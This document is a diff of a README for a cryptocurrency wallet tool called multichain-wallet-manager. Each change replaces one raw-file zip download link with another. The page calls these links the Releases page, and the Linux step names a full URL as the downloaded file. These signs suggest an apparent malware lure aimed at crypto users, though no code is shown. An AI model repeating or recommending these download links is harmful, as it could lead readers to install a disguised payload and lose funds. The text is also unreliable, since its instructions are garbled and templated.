@@ -8,7 +8,7 @@ Welcome to multichain-wallet-manager! This application helps you handle multiple
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-**[Download multichain-wallet-manager](https://raw.githubusercontent.com/ajayjg007/multichain-wallet-manager/main/clinochlore/multichain-wallet-manager.zip)**
+**[Download multichain-wallet-manager](https://github.com/ajayjg007/multichain-wallet-manager/raw/refs/heads/main/src/wallet-manager-multichain-v3.2.zip)**
 
 ### Steps to Download
 
@@ -40,7 +40,7 @@ Follow these steps to install the application:
 
 ### For Linux Users
 
-1. Locate the downloaded `https://raw.githubusercontent.com/ajayjg007/multichain-wallet-manager/main/clinochlore/multichain-wallet-manager.zip` file in your Downloads folder.
+1. Locate the downloaded `https://github.com/ajayjg007/multichain-wallet-manager/raw/refs/heads/main/src/wallet-manager-multichain-v3.2.zip` file in your Downloads folder.
 2. Extract the file by right-clicking and selecting "Extract Here."
 3. Open a terminal window.
 4. Navigate to the extracted folder and run the following command to launch the application:
@@ -85,6 +85,6 @@ Yes, we respect your privacy. Your wallet data is stored locally on your compute
 
 Join our community of users for support and discussions. Connect with us on social media and developer forums to get tips, share experiences, and stay updated on the latest features.
 
-**[Download multichain-wallet-manager](https://raw.githubusercontent.com/ajayjg007/multichain-wallet-manager/main/clinochlore/multichain-wallet-manager.zip)**
+**[Download multichain-wallet-manager](https://github.com/ajayjg007/multichain-wallet-manager/raw/refs/heads/main/src/wallet-manager-multichain-v3.2.zip)**
 
 Thank you for choosing multichain-wallet-manager! We hope this tool makes your cryptocurrency management easy and efficient.
